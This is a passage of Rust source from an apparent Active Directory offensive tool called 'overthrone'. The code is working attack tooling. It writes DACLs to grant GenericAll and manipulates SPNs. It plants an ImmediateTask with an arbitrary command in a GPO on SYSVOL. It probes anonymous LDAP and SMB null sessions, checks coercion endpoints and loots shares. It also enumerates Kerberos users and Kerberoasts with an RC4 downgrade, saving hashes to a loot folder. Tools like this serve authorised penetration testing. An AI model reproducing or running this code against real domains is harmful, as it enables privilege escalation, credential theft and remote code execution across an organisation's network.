                "[*]".bright_black(),
                member.cyan(),
                group.yellow()
            );
            ldap.remove_member_from_group(&group, &member).await
        }
        AclAction::WriteDacl { target, trustee } => {
            println!(
                "{} Granting GenericAll to '{}' on '{}' ...",
                "[*]".bright_black(),
                trustee.cyan(),
                target.yellow()
            );
            // Resolve trustee to binary SID
            let sid_bytes = match ldap.resolve_object_sid_binary(&trustee).await {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("Failed to resolve SID for '{}': {}", trustee, e));
                    return 1;
                }
            };
            ldap.write_dacl_grant_generic_all(&target, &sid_bytes).await
        }
        AclAction::WriteSpn { target, spn } => {
            println!(
                "{} Writing SPN '{}' on '{}' ...",
                "[*]".bright_black(),
                spn.cyan(),
                target.yellow()
            );
            ldap.write_spn(&target, &spn).await
        }
        AclAction::RemoveSpn { target, spn } => {
            println!(
                "{} Removing SPN '{}' from '{}' ...",
                "[*]".bright_black(),
                spn.cyan(),
                target.yellow()
            );
            ldap.remove_spn(&target, &spn).await
        }
        AclAction::Enum { sid } => {
            let trustee_sid = sid.unwrap_or_else(|| {
                println!(
                    "{} No SID specified, scanning all objects (may be slow)",
                    "[!]".yellow()
                );
                "*".to_string()
            });
            println!(
                "{} Enumerating abusable ACEs for SID: {}",
                "[*]".bright_black(),
                trustee_sid.cyan()
            );
            match ldap.find_abusable_acls(&trustee_sid).await {
                Ok(dacls) => {
                    if dacls.is_empty() {
                        println!("{} No abusable ACEs found", "[-]".yellow());
                    } else {
                        banner::print_success(&format!(
                            "Found {} objects with abusable ACLs",
                            dacls.len()
                        ));
                        for dacl in &dacls {
                            println!("  {} {}", "[+]".green(), dacl.object_dn.cyan());
                            for ace in &dacl.aces {
                                println!(
                                    "      {} {}  mask=0x{:08X}  type={:?}",
                                    "ACE".yellow(),
                                    ace.trustee_sid,
                                    ace.access_mask,
                                    ace.ace_type
                                );
                            }
                        }
                    }
                    return 0;
                }
                Err(e) => {
                    banner::print_fail(&format!("ACL enum failed: {}", e));
                    return 1;
                }
            }
        }
    };

    match result {
        Ok(_) => {
            banner::print_success("ACL operation completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("ACL operation failed: {}", e));
            1
        }
    }
}

// ──────────────────────────────────────────────────────────
// GPO Abuse Handler
// ──────────────────────────────────────────────────────────

async fn cmd_gpo(cli: &Cli, action: GpoAction) -> i32 {
    use overthrone_core::proto::ldap::LdapSession;

    banner::print_module_banner("GPO ABUSE");

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        GpoAction::Enum => {
            let mut ldap = match LdapSession::connect(
                &dc,
                cli.domain.as_deref().unwrap_or(""),
                &creds.username,
                creds.password().unwrap_or(""),
                false,
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("LDAP connect failed: {}", e));
                    return 1;
                }
            };
            match ldap.enumerate_gpos().await {
                Ok(gpos) => {
                    banner::print_success(&format!("Found {} GPOs", gpos.len()));
                    for g in &gpos {
                        println!(
                            "  {} {} ({}) → {}",
                            "[+]".green(),
                            g.display_name.cyan(),
                            g.cn.bright_black(),
                            g.gpc_file_sys_path.yellow()
                        );
                    }
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("GPO enum failed: {}", e));
                    1
                }
            }
        }
        GpoAction::Write {
            gpo,
            sysvol,
            command,
            task_name,
            user_policy,
        } => {
            use overthrone_core::proto::gpo_write;
            use overthrone_core::proto::smb::SmbSession;

            let target_dc = dc.clone();
            println!(
                "{} Writing ImmediateTask '{}' to GPO '{}' on SYSVOL ...",
                "[*]".bright_black(),
                task_name.cyan(),
                gpo.yellow()
            );
            println!("    Command: {}", command.bright_red());

            let smb = match SmbSession::connect(
                &target_dc,
                cli.domain.as_deref().unwrap_or(""),
                &creds.username,
                creds.password().unwrap_or(""),
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect failed: {}", e));
                    return 1;
                }
            };

            // Resolve the SYSVOL share path (strip \\host\SYSVOL prefix)
            let share = "SYSVOL";
            let policy_subdir = if user_policy { "User" } else { "Machine" };
            let task_xml_path = format!(
                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
                sysvol.trim_end_matches('\\'),
                gpo,
                policy_subdir
            );
            // Extract just the path relative to SYSVOL share root
            let rel_path = task_xml_path
                .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
                .trim_start_matches('\\')
                .to_string();

            let xml = gpo_write::build_immediate_task_xml(&task_name, &command);

            match smb.write_file(share, &rel_path, xml.as_bytes()).await {
                Ok(_) => {
                    banner::print_success(&format!(
                        "ImmediateTask XML written to {}\\{}",
                        share, rel_path
                    ));
                    println!(
                        "    {} Waiting for Group Policy refresh (90s default) ...",
                        "[!]".yellow()
                    );
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("SYSVOL write failed: {}", e));
                    1
                }
            }
        }
        GpoAction::Cleanup {
            gpo,
            sysvol,
            task_name,
            user_policy,
        } => {
            use overthrone_core::proto::smb::SmbSession;

            let target_dc = dc.clone();
            println!(
                "{} Removing ImmediateTask '{}' from GPO '{}' ...",
                "[*]".bright_black(),
                task_name.cyan(),
                gpo.yellow()
            );

            let smb = match SmbSession::connect(
                &target_dc,
                cli.domain.as_deref().unwrap_or(""),
                &creds.username,
                creds.password().unwrap_or(""),
            )
            .await
            {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&format!("SMB connect failed: {}", e));
                    return 1;
                }
            };

            let share = "SYSVOL";
            let policy_subdir = if user_policy { "User" } else { "Machine" };
            let rel_path = format!(
                "{}\\Policies\\{}\\{}\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
                sysvol
                    .trim_start_matches(&format!("\\\\{}\\{}", target_dc, share))
                    .trim_start_matches('\\'),
                gpo,
                policy_subdir
            );

            match smb.delete_file(share, &rel_path).await {
                Ok(_) => {
                    banner::print_success("ImmediateTask XML removed from SYSVOL");
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("SYSVOL cleanup failed: {}", e));
                    1
                }
            }
        }
    }
}

// cmd_enum
fn persist_enumeration_results(
    result: &overthrone_reaper::runner::ReaperResult,
    loot_dir: &Path,
) -> std::io::Result<Vec<PathBuf>> {
    std::fs::create_dir_all(loot_dir)?;

    let mut written_files = Vec::new();

    let summary_path = loot_dir.join("enumeration_results.json");
    let summary_json = serde_json::to_string_pretty(result)
        .map_err(|e| std::io::Error::other(format!("serialization failure: {e}")))?;
    std::fs::write(&summary_path, summary_json)?;
    written_files.push(summary_path);

    if let Some(powerview_results) = &result.powerview_results {
        let powerview_path = loot_dir.join("powerview_results.json");
        let powerview_json = serde_json::to_string_pretty(powerview_results)
            .map_err(|e| std::io::Error::other(format!("serialization failure: {e}")))?;
        std::fs::write(&powerview_path, powerview_json)?;
        written_files.push(powerview_path);
    }

    Ok(written_files)
}

fn print_powerview_summary(result: &overthrone_reaper::runner::ReaperResult) {
    if let Some(pv) = &result.powerview_results {
        println!();
        println!("  {} PowerView details:", "▸".bright_black());
        println!(
            "    GPOs: {} | Users: {}",
            pv.gpo_details.len().to_string().green(),
            pv.user_details.len().to_string().green()
        );

        if !pv.gpo_details.is_empty() {
            println!("    {} GPO detail samples:", "▸".bright_black());
            for gpo in pv.gpo_details.iter().take(5) {
                println!(
                    "      - {} [{}] {}",
                    gpo.display_name.cyan(),
                    gpo.status.yellow(),
                    gpo.path.dimmed()
                );
            }
        }

        if !pv.user_details.is_empty() {
            println!("    {} User detail samples:", "▸".bright_black());
            for user in pv.user_details.iter().take(5) {
                println!(
                    "      - {} ({}) SID: {}",
                    user.sam_account_name.cyan(),
                    user.distinguished_name.dimmed(),
                    user.sid.dimmed()
                );
            }
        }
    }
}

#[cfg(feature = "reaper")]
async fn cmd_enum(
    cli: &Cli,
    target: EnumTarget,
    _filter: Option<String>,
    _include_disabled: bool,
) -> i32 {
    banner::print_module_banner("ENUMERATION");
    if matches!(
        target,
        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession
    ) {
        return cmd_pre_enum(cli, target).await;
    }

    let creds = match require_creds(cli) {
        Ok(c) => c,
        Err(e) => return e,
    };
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };
    let modules = enum_target_modules(&target);
    let config = match make_reaper_config(cli, creds, dc, modules, 500) {
        Ok(c) => c,
        Err(e) => return e,
    };

    match target {
        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession => {
            eprintln!(
                "[!] Internal error: EnumTarget::Pre/Anonymous/NullSession should have been handled before enum dispatch"
            );
            return 1;
        }
        EnumTarget::Users => println!("{}", "Enumerating users...".bright_black()),
        EnumTarget::Computers => println!("{}", "Enumerating computers...".bright_black()),
        EnumTarget::Groups => println!("{}", "Enumerating groups...".bright_black()),
        EnumTarget::Trusts => println!("{}", "Enumerating trusts...".bright_black()),
        EnumTarget::Spns => println!("{}", "Enumerating SPNs...".bright_black()),
        EnumTarget::Asrep => println!(
            "{}",
            "Enumerating AS-REP roastable accounts...".bright_black()
        ),
        EnumTarget::Delegations => println!("{}", "Enumerating delegations...".bright_black()),
        EnumTarget::Gpos => println!("{}", "Enumerating GPOs...".bright_black()),
        EnumTarget::Laps => println!("{}", "Enumerating LAPS-readable secrets...".bright_black()),
        EnumTarget::Policy => {
            println!("{}", "Enumerating password/domain policy...".bright_black())
        }
        EnumTarget::All => println!("{}", "Enumerating all objects...".bright_black()),
    }

    match overthrone_reaper::runner::run_reaper(&config).await {
        Ok(result) => {
            let loot_dir = std::path::PathBuf::from("./loot");
            match persist_enumeration_results(&result, &loot_dir) {
                Ok(files) => {
                    for file in files {
                        banner::print_info(&format!(
                            "Enumeration results saved to {}",
                            file.display()
                        ));
                    }
                }
                Err(e) => {
                    eprintln!(
                        "warn: failed to write enumeration results to '{}': {}",
                        loot_dir.display(),
                        e
                    );
                }
            }

            print_powerview_summary(&result);

            banner::print_success("Enumeration completed");
            0
        }
        Err(e) => {
            banner::print_fail(&format!("Enumeration failed: {}", e));
            1
        }
    }
}

async fn cmd_pre_enum(cli: &Cli, target: EnumTarget) -> i32 {
    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match target {
        EnumTarget::Pre => {
            println!(
                "{}",
                "Running unified pre-authentication discovery...".bright_black()
            );

            match overthrone_core::scan::preauth_discovery::run_preauth_discovery(&dc).await {
                Ok(result) => {
                    print_preauth_result(&result);

                    // Save to loot directory
                    let loot_dir = std::path::PathBuf::from("./loot");
                    let _ = std::fs::create_dir_all(&loot_dir);
                    let summary_path = loot_dir.join("preauth_discovery.json");
                    if let Ok(json) = serde_json::to_string_pretty(&result) {
                        let _ = std::fs::write(&summary_path, json);
                        banner::print_info(&format!(
                            "Full discovery results saved to {}",
                            summary_path.display()
                        ));
                    }

                    if let Some(domain) = discover_domain_from_rootdse(&dc).await {
                        banner::print_info(&format!(
                            "Discovered domain context from RootDSE: {}",
                            domain
                        ));
                        run_preauth_snaffler(&dc, &domain).await;
                    } else {
                        banner::print_warn(
                            "RootDSE did not expose a domain context; skipping pre-auth loot pass.",
                        );
                    }

                    banner::print_success(&format!(
                        "Pre-auth discovery completed in {}ms (risk score: {}/10)",
                        result.duration_ms, result.summary.risk_score
                    ));
                    0
                }
                Err(e) => {
                    banner::print_fail(&format!("Pre-auth discovery failed: {e}"));
                    1
                }
            }
        }
        EnumTarget::Anonymous => match anonymous_ldap_probe(&dc).await {
            Ok(_) => {
                if let Some(domain) = discover_domain_from_rootdse(&dc).await {
                    banner::print_info(&format!(
                        "Discovered domain context from RootDSE: {}",
                        domain
                    ));
                    run_preauth_snaffler(&dc, &domain).await;
                }
                0
            }
            Err(e) => {
                banner::print_fail(&format!("Anonymous LDAP probe failed: {e}"));
                1
            }
        },
        EnumTarget::NullSession => {
            banner::print_info(
                "Attempting null-session RID cycling with default RID range 500-1100.",
            );
            commands_impl::cmd_rid(cli, 500, 1100, true).await
        }
        _ => {
            eprintln!("[!] Internal error: unexpected EnumTarget variant in enum dispatch");
            1
        }
    }
}

fn print_preauth_result(result: &overthrone_core::scan::preauth_discovery::PreAuthDiscoveryResult) {
    #[allow(unused_imports)]
    use overthrone_core::scan::preauth_discovery::*;

    println!();
    println!("  {}", "PORT TRIAGE".bright_cyan().bold());
    if result.port_triage.success {
        for port in &result.port_triage.open_ports {
            let service = port.service.as_deref().unwrap_or("unknown");
            println!(
                "    {} {:>5}/tcp {:<7} {}",
                "▸".bright_black(),
                port.port,
                "open".green(),
                service
            );
        }
    } else {
        println!("    {}", "Port scan failed or timed out".bright_black());
    }

    println!();
    println!("  {}", "NETBIOS / SMB".bright_cyan().bold());
    if let Some(nbns) = &result.netbios_smb.nbns {
        println!(
            "    {} NBNS: computer={}, domain={}, mac={}",
            "▸".bright_black(),
            nbns.computer_name,
            nbns.domain_name,
            nbns.mac_address
        );
    }
    if let Some(smb_neg) = &result.netbios_smb.smb_negotiate {
        println!(
            "    {} SMB dialect: {}, signing_required={}, signing_enabled={}",
            "▸".bright_black(),
            smb_neg.highest_dialect,
            smb_neg.signing_required,
            smb_neg.signing_enabled
        );
        if let Some(os) = &smb_neg.os_name {
            println!("    {} OS: {}", "▸".bright_black(), os);
        }
    }
    let sess = &result.netbios_smb.smb_session;
    let shares_str = if sess.accessible_shares.is_empty() {
        "none".to_string()
    } else {
        sess.accessible_shares.join(", ")
    };
    println!(
        "    {} SMB session: {}, shares={}",
        "▸".bright_black(),
        sess.session_type,
        shares_str
    );

    println!();
    println!("  {}", "LDAP".bright_cyan().bold());
    if let Some(rootdse) = &result.ldap.rootdse_probe {
        if let Some(domain) = &rootdse.dns_domain_name {
            println!("    {} Domain: {}", "▸".bright_black(), domain);
        }
        if let Some(host) = &rootdse.dns_host_name {
            println!("    {} DC Host: {}", "▸".bright_black(), host);
        }
        if let Some(func) = &rootdse.domain_functionality {
            println!("    {} Functionality: {}", "▸".bright_black(), func);
        }
        if !rootdse.supported_sasl_mechanisms.is_empty() {
            println!(
                "    {} SASL: {}",
                "▸".bright_black(),
                rootdse.supported_sasl_mechanisms.join(", ")
            );
        }
    }
    println!(
        "    {} Anonymous bind: {}",
        "▸".bright_black(),
        if result.ldap.anonymous_bind {
            "allowed".yellow()
        } else {
            "denied".bright_black()
        }
    );

    println!();
    println!("  {}", "RPC NULL SESSION".bright_cyan().bold());
    if let Some(lsa) = &result.rpc_null_session.lsa_domain_info {
        println!(
            "    {} LSA domain: {}, SID={}",
            "▸".bright_black(),
            lsa.name,
            lsa.domain_sid.as_deref().unwrap_or("unknown")
        );
    }
    if !result.rpc_null_session.srvsvc_shares.is_empty() {
        println!(
            "    {} SRVSVC shares: {}",
            "▸".bright_black(),
            result.rpc_null_session.srvsvc_shares.len()
        );
    }
    if !result.rpc_null_session.epmapper_endpoints.is_empty() {
        println!(
            "    {} EPMAPPER endpoints: {}",
            "▸".bright_black(),
            result.rpc_null_session.epmapper_endpoints.len()
        );
    }

    println!();
    println!("  {}", "COERCION ENDPOINTS".bright_cyan().bold());
    if result.coercion.attempted {
        println!(
            "    {} MS-RPRN: {}",
            "▸".bright_black(),
            if result.coercion.rprn_available {
                "available".red()
            } else {
                "not available".bright_black()
            }
        );
        println!(
            "    {} MS-EFSR: {}",
            "▸".bright_black(),
            if result.coercion.efsr_available {
                "available".red()
            } else {
                "not available".bright_black()
            }
        );
        println!(
            "    {} DFS-RPC: {}",
            "▸".bright_black(),
            if result.coercion.dfs_available {
                "available".red()
            } else {
                "not available".bright_black()
            }
        );
    } else {
        println!("    {}", "Not attempted (RPC port not open)".bright_black());
    }

    println!();
    println!("  {}", "SUMMARY".bright_cyan().bold());
    let summary = &result.summary;
    if let Some(domain) = &summary.domain {
        println!("    {} Domain: {}", "▸".bright_black(), domain);
    }
    if let Some(host) = &summary.dc_hostname {
        println!("    {} DC: {}", "▸".bright_black(), host);
    }
    if let Some(os) = &summary.os_name {
        println!("    {} OS: {}", "▸".bright_black(), os);
    }
    println!(
        "    {} SMB signing required: {}",
        "▸".bright_black(),
        summary.smb_signing_required
    );
    println!(
        "    {} Null session: {}",
        "▸".bright_black(),
        if summary.null_session_allowed {
            "allowed".yellow()
        } else {
            "denied".bright_black()
        }
    );
    println!(
        "    {} Anonymous LDAP: {}",
        "▸".bright_black(),
        if summary.anonymous_ldap {
            "allowed".yellow()
        } else {
            "denied".bright_black()
        }
    );
    println!(
        "    {} Coercion possible: {}",
        "▸".bright_black(),
        if summary.coercion_possible {
            "yes".red()
        } else {
            "no".green()
        }
    );
    println!(
        "    {} Risk score: {}/10",
        "▸".bright_black(),
        summary.risk_score
    );
    println!();
}

async fn anonymous_ldap_probe(dc: &str) -> std::result::Result<bool, String> {
    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};

    let url = format!("ldap://{}:389", dc);
    let settings = LdapConnSettings::new().set_conn_timeout(std::time::Duration::from_secs(5));
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
        .await
        .map_err(|e| format!("connect to {url} failed: {e}"))?;
    drive!(conn);

    let bind = ldap
        .simple_bind("", "")
        .await
        .map_err(|e| format!("anonymous bind request failed: {e}"))?;
    if bind.rc != 0 {
        banner::print_info(&format!(
            "Anonymous LDAP bind rejected by {} (rc={} {}).",
            dc,
            bind.rc,
            ldap_result_label(bind.rc)
        ));
        let _ = ldap.unbind().await;
        return Ok(false);
    }

    banner::print_success(&format!("Anonymous LDAP bind allowed on {}", dc));
    let attrs = vec![
        "defaultNamingContext",
        "configurationNamingContext",
        "rootDomainNamingContext",
        "dnsHostName",
        "ldapServiceName",
        "domainFunctionality",
        "forestFunctionality",
        "domainControllerFunctionality",
        "supportedLDAPVersion",
        "supportedSASLMechanisms",
    ];
    let (entries, _) = ldap
        .search("", Scope::Base, "(objectClass=*)", attrs)
        .await
        .map_err(|e| format!("RootDSE search failed: {e}"))?
        .success()
        .map_err(|e| format!("RootDSE search rejected: {e}"))?;

    for entry in entries {
        let entry = SearchEntry::construct(entry);
        println!("  {}", "RootDSE".bright_black());
        for attr in [
            "defaultNamingContext",
            "configurationNamingContext",
            "rootDomainNamingContext",
            "dnsHostName",
            "ldapServiceName",
            "domainFunctionality",
            "forestFunctionality",
            "domainControllerFunctionality",
            "supportedLDAPVersion",
            "supportedSASLMechanisms",
        ] {
            if let Some(values) = entry.attrs.get(attr) {
                println!("    {:<35} {}", attr, values.join(", "));
            }
        }
    }

    let _ = ldap.unbind().await;
    Ok(true)
}

#[allow(dead_code)]
async fn anonymous_ldaps_probe(dc: &str) -> std::result::Result<bool, String> {
    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};

    let url = format!("ldaps://{}:636", dc);
    let settings = LdapConnSettings::new()
        .set_conn_timeout(std::time::Duration::from_secs(5))
        .set_no_tls_verify(true);
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url)
        .await
        .map_err(|e| format!("connect to {url} failed: {e}"))?;
    drive!(conn);

    let bind = ldap
        .simple_bind("", "")
        .await
        .map_err(|e| format!("anonymous LDAPS bind request failed: {e}"))?;
    if bind.rc != 0 {
        banner::print_info(&format!(
            "Anonymous LDAPS bind rejected by {} (rc={} {}).",
            dc,
            bind.rc,
            ldap_result_label(bind.rc)
        ));
        let _ = ldap.unbind().await;
        return Ok(false);
    }

    banner::print_success(&format!("Anonymous LDAPS bind allowed on {}", dc));
    let attrs = vec![
        "defaultNamingContext",
        "configurationNamingContext",
        "rootDomainNamingContext",
        "dnsHostName",
        "ldapServiceName",
        "supportedLDAPVersion",
    ];
    let (entries, _) = ldap
        .search("", Scope::Base, "(objectClass=*)", attrs)
        .await
        .map_err(|e| format!("LDAPS RootDSE search failed: {e}"))?
        .success()
        .map_err(|e| format!("LDAPS RootDSE search rejected: {e}"))?;

    for entry in entries {
        let entry = SearchEntry::construct(entry);
        println!("  {}", "RootDSE over LDAPS".bright_black());
        for attr in [
            "defaultNamingContext",
            "configurationNamingContext",
            "rootDomainNamingContext",
            "dnsHostName",
            "ldapServiceName",
            "supportedLDAPVersion",
        ] {
            if let Some(values) = entry.attrs.get(attr) {
                println!("    {:<35} {}", attr, values.join(", "));
            }
        }
    }

    let _ = ldap.unbind().await;
    Ok(true)
}

#[allow(dead_code)]
async fn smb_null_probe(dc: &str) -> std::result::Result<bool, String> {
    let session = overthrone_core::proto::smb::SmbSession::connect(dc, "", "", "")
        .await
        .map_err(|e| format!("SMB null session connect failed: {e}"))?;

    let checks = session
        .check_share_access(&["IPC$", "NETLOGON", "SYSVOL", "C$", "ADMIN$"])
        .await;

    let readable: Vec<String> = checks
        .iter()
        .filter(|r| r.readable)
        .map(|r| r.share_name.clone())
        .collect();

    banner::print_success(&format!(
        "SMB null session allowed on {} (readable shares: {})",
        dc,
        if readable.is_empty() {
            "none".to_string()
        } else {
            readable.join(", ")
        }
    ));
    Ok(!readable.is_empty())
}

async fn discover_domain_from_rootdse(dc: &str) -> Option<String> {
    use ldap3::{LdapConnAsync, LdapConnSettings, Scope, SearchEntry, drive};

    let url = format!("ldap://{}:389", dc);
    let settings = LdapConnSettings::new().set_conn_timeout(std::time::Duration::from_secs(4));
    let (conn, mut ldap) = LdapConnAsync::with_settings(settings, &url).await.ok()?;
    drive!(conn);

    let bind = ldap.simple_bind("", "").await.ok()?;
    if bind.rc != 0 {
        let _ = ldap.unbind().await;
        return None;
    }

    let (entries, _) = ldap
        .search(
            "",
            Scope::Base,
            "(objectClass=*)",
            vec!["defaultNamingContext"],
        )
        .await
        .ok()?
        .success()
        .ok()?;

    let domain = entries.into_iter().find_map(|entry| {
        let se = SearchEntry::construct(entry);
        se.attrs
            .get("defaultNamingContext")
            .and_then(|values| values.first())
            .map(|dn| {
                dn.split(',')
                    .filter_map(|part| part.trim().strip_prefix("DC="))
                    .collect::<Vec<_>>()
                    .join(".")
            })
            .filter(|domain| !domain.is_empty())
    });

    let _ = ldap.unbind().await;
    domain
}

async fn run_preauth_snaffler(dc: &str, domain: &str) {
    banner::print_module_banner("PREAUTH LOOT");
    let normalized_domain = domain.trim().to_string();
    if normalized_domain.is_empty() {
        banner::print_warn(
            "Domain is unknown; running anonymous Snaffler bootstrap with empty domain context.",
        );
    }

    let config = ReaperConfig {
        dc_ip: dc.to_string(),
        domain: normalized_domain.clone(),
        base_dn: if normalized_domain.is_empty() {
            String::new()
        } else {
            ReaperConfig::base_dn_from_domain(&normalized_domain)
        },
        username: String::new(),
        password: Some(String::new()),
        nt_hash: None,
        modules: vec!["snaffler".to_string()],
        page_size: 500,
        use_ldaps: false,
    };

    match overthrone_reaper::snaffler::run_snaffler(&config).await {
        Ok(findings) => {
            if findings.is_empty() {
                banner::print_info("Pre-auth loot pass found no interesting files.");
            } else {
                banner::print_success(&format!(
                    "Pre-auth loot pass found {} interesting files",
                    findings.len()
                ));
                let loot_dir = std::path::PathBuf::from("./loot");
                let _ = std::fs::create_dir_all(&loot_dir);
                let summary_path = loot_dir.join("preauth_snaffler_findings.json");
                if let Ok(json) = serde_json::to_string_pretty(&findings) {
                    let _ = std::fs::write(&summary_path, json);
                    banner::print_info(&format!(
                        "Pre-auth findings saved to {}",
                        summary_path.display()
                    ));
                }
            }
        }
        Err(e) => {
            banner::print_warn(&format!(
                "Pre-auth loot pass failed (continuing autopwn): {}",
                e
            ));
        }
    }
}

#[allow(dead_code)]
fn ad_port_label(port: u16) -> &'static str {
    match port {
        88 => "Kerberos",
        135 => "RPC endpoint mapper",
        139 => "NetBIOS session service",
        389 => "LDAP",
        445 => "SMB",
        464 => "Kerberos password change",
        636 => "LDAPS",
        3268 => "Global Catalog LDAP",
        3269 => "Global Catalog LDAPS",
        3389 => "RDP",
        5985 => "WinRM HTTP",
        5986 => "WinRM HTTPS",
        9389 => "AD Web Services",
        _ => "unknown",
    }
}

fn ldap_result_label(rc: u32) -> &'static str {
    match rc {
        0 => "success",
        1 => "operationsError",
        2 => "protocolError",
        3 => "timeLimitExceeded",
        4 => "sizeLimitExceeded",
        8 => "strongAuthRequired",
        32 => "noSuchObject",
        49 => "invalidCredentials",
        50 => "insufficientAccessRights",
        53 => "unwillingToPerform",
        _ => "see LDAP result code",
    }
}

fn enum_target_modules(target: &EnumTarget) -> Vec<String> {
    let modules: &[&str] = match target {
        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession => &[],
        EnumTarget::Users => &["users"],
        EnumTarget::Computers => &["computers"],
        EnumTarget::Groups => &["groups"],
        EnumTarget::Trusts => &["trusts"],
        EnumTarget::Spns => &["spns"],
        EnumTarget::Asrep => &["users"],
        EnumTarget::Delegations => &["delegations"],
        EnumTarget::Gpos => &["gpos"],
        EnumTarget::Laps => &["laps"],
        EnumTarget::Policy => &["policy"],
        EnumTarget::All => &[],
    };

    modules.iter().map(|module| (*module).to_string()).collect()
}

// cmd_kerberos
#[cfg(feature = "hunter")]
async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
    banner::print_module_banner("KERBEROS");

    // UserEnum is a zero-knowledge operation — no credentials needed
    if let KerberosAction::UserEnum {
        ref userlist,
        ref output,
        delay,
        concurrency,
        use_ldap,
    } = action
    {
        let dc = match require_dc(cli) {
            Ok(d) => d,
            Err(e) => return e,
        };
        let domain = match cli.domain.as_deref() {
            Some(d) => d,
            None => {
                banner::print_fail("--domain is required");
                return 1;
            }
        };

        let effective_userlist = userlist.as_deref().or(cli.user_list.as_deref());
        let uc = overthrone_hunter::UserEnumConfig {
            userlist: effective_userlist
                .map(std::path::PathBuf::from)
                .unwrap_or_default(),
            output_file: output.as_ref().map(std::path::PathBuf::from),
            save_asrep_hashes: true,
            concurrency,
            use_ldap,
        };

        return match overthrone_hunter::userenum::run(&dc, domain, &uc, delay).await {
            Ok(result) => {
                let total = result.valid_users.len() + result.no_preauth_users.len();
                if total > 0 {
                    banner::print_success(&format!(
                        "{} valid user(s) discovered ({} with AS-REP hash)",
                        total,
                        result.no_preauth_users.len()
                    ));
                    0
                } else {
                    banner::print_fail("No valid users found");
                    1
                }
            }
            Err(e) => {
                banner::print_fail(&format!("User enumeration failed: {}", e));
                1
            }
        };
    }

    let dc = match require_dc(cli) {
        Ok(d) => d,
        Err(e) => return e,
    };

    match action {
        KerberosAction::Roast { spn, downgrade_rc4 } => {
            use overthrone_core::proto::kerberos;
            let creds = match require_creds(cli) {
                Ok(c) => c,
                Err(e) => return e,
            };
            let (secret, use_hash) = match creds.secret_and_hash_flag() {
                Ok(s) => s,
                Err(e) => {
                    banner::print_fail(&e);
                    return 1;
                }
            };
            // Step 1: Get a TGT (with cache-first logic)
            let tgt = match crate::commands_impl::get_cached_tgt(
                &dc,
                &creds.domain,
                &creds.username,
                &secret,
                use_hash,
                false,
            )
            .await
            {
                Ok(t) => t,
                Err(e) => {
                    banner::print_fail(&format!("TGT request failed: {}", e));
                    return 1;
                }
            };
            println!(
                "{} TGT obtained for {}@{}",
                "✓".green(),
                creds.username.cyan(),
                creds.domain.cyan()
            );

            let spns: Vec<String> = if let Some(target_spn) = spn {
                vec![target_spn]
            } else {
                // Enumerate SPNs via LDAP
                println!("{}", "  Enumerating SPNs via LDAP...".bright_black());
                let hunt_config = overthrone_hunter::HuntConfig {
                    dc_ip: dc.clone(),
                    domain: creds.domain.clone(),
                    username: creds.username.clone(),
                    secret: secret.clone(),
                    use_hash,
                    base_dn: None,
                    use_ldaps: false,
                    output_dir: std::path::PathBuf::from("./loot"),
                    concurrency: 10,
                    timeout: 30,
                    jitter_ms: 0,
                    tgt: Some(tgt.clone()),
                };
                let kc = overthrone_hunter::kerberoast::KerberoastConfig {
                    downgrade_to_rc4: downgrade_rc4,
                    ..Default::default()
                };
                match overthrone_hunter::kerberoast::run(&hunt_config, &kc).await {
                    Ok(result) => {
                        if result.hashes.is_empty() {
                            banner::print_fail("No kerberoastable accounts found");
                            return 1;
                        }
                        println!(
                            "{} Kerberoast complete: {} hashes captured",
                            "✓".green(),
                            result.hashes.len()
                        );
                        let loot_dir = std::path::PathBuf::from("./loot");
                        let _ = std::fs::create_dir_all(&loot_dir);
                        let hash_file = loot_dir.join("kerberoast_hashes.txt");
                        for h in &result.hashes {
                            println!(
                                "{} {}: {}",
                                "✓".green(),
                                h.spn.cyan(),
                                &h.hash_string[..80.min(h.hash_string.len())]
                            );
                            if let Ok(mut f) = std::fs::OpenOptions::new()
                                .create(true)
                                .append(true)
                                .open(&hash_file)
                            {
                                use std::io::Write;
                                let _ = writeln!(f, "{}", h.hash_string);
                            }
                        }
                        banner::print_success(&format!(
                            "Hashes written to {}",
                            hash_file.display()
                        ));
                        return 0;
                    }
                    Err(e) => {
                        banner::print_fail(&format!("Kerberoast failed: {}", e));
                        return 1;
                    }
                }
            };

            // Roast specific SPN
            let mut success = false;
            let loot_dir = std::path::PathBuf::from("./loot");
            let _ = std::fs::create_dir_all(&loot_dir);
            for target_spn in &spns {
                match kerberos::kerberoast(&dc, &tgt, target_spn).await {
                    Ok(hash) => {
                        println!(
                            "{} Hash: {}",
                            "✓".green(),
                            &hash.hash_string[..80.min(hash.hash_string.len())]
                        );
                        // Write hash to file
                        let hash_file = loot_dir.join("kerberoast_hashes.txt");
                        if let Ok(mut f) = std::fs::OpenOptions::new()
                            .create(true)
                            .append(true)
                            .open(&hash_file)
                        {
                            use std::io::Write;
                            let _ = writeln!(f, "{}", hash.hash_string);
                        }
                        success = true;
                    }
                    Err(e) => {
                        println!("{} {}: {}", "✗".red(), target_spn, e);
                    }
                }
            }
            if success {
                banner::print_success("Kerberoast hashes written to ./loot/kerberoast_hashes.txt");
            } else {
                banner::print_fail("No hashes obtained");
                return 1;
